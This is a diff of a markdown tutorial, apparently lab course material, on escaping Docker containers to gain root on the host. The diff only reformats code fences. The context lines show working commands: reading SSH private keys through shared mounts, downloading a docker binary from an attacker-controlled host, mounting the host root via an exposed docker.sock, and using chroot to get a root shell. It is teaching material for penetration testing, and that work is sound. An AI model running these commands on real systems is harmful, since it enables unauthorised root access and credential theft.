@@ -74,8 +74,7 @@ Shared directories offer several advantages, including the ability to persist da
 
 When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.
 
-```
-        shellsession
+```shellsession
 root@container:~$ cd /hostsystem/home/cry0l1t3
 root@container:/hostsystem/home/cry0l1t3$ ls -l
 
@@ -92,8 +91,7 @@ root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
 
 From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
 ```
 
@@ -103,8 +101,7 @@ A Docker socket or Docker daemon socket is a special file that allows us and pro
 
 Nevertheless, Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorized access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios. However, depending on the configuration, there are many ways where automated processes or tasks can be stored. Those files can contain very useful information for us that we can use to escape the Docker container.
 
-```
-        shellsession
+```shellsession
 htb-student@container:~/app$ ls -al
 
 total 8
@@ -115,8 +112,7 @@ srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
 
 From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x86_64/docker) and upload it to the Docker container.
 
-```
-        shellsession
+```shellsession
 htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
 htb-student@container:/tmp$ chmod +x docker
 htb-student@container:/tmp$ ls -l
@@ -132,8 +128,7 @@ CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS     
 
 We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.
 
-```
-        shellsession
+```shellsession
 htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
 htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps
 
@@ -145,8 +140,7 @@ CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS 
 
 Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.
 
-```
-        shellsession
+```shellsession
 htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
 
 root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa
@@ -161,8 +155,7 @@ From there, we can again try to grab the private SSH key and log in as root or a
 
 To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.
 
-```
-        shellsession
+```shellsession
 docker-user@nix02:~$ id
 
 uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
@@ -174,8 +167,7 @@ Most hosts have a direct internet connection because the base images and contain
 
 To see which images exist and which we can access, we can use the following command:
 
-```
-        shellsession
+```shellsession
 docker-user@nix02:~$ docker image ls
 
 REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
@@ -186,8 +178,7 @@ ubuntu                               20.04               20fffa419e3a   2 days a
 
 A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.
 
-```
-        shellsession
+```shellsession
 docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 
 root@ubuntu:~# ls -l
